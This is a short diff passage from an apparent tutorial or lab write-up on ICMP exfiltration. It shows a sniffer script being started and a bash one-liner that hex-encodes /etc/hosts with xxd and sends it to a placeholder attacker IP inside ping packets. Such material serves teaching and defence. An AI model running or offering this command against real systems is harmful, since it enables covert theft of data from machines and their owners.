@@ -10,6 +10,7 @@ We let our sniffer listen.
 ``` python
 python3 icmp_exfiltration.py 2> /dev/null
 ```
+Using the xxd command we can encode a file and send it to the attacker's sniffer via ping.
 
 ```bash
 xxd -p -c 4 /etc/hosts | while read line; do ping -c 1 -p $line <attackers_IP_address> ; done
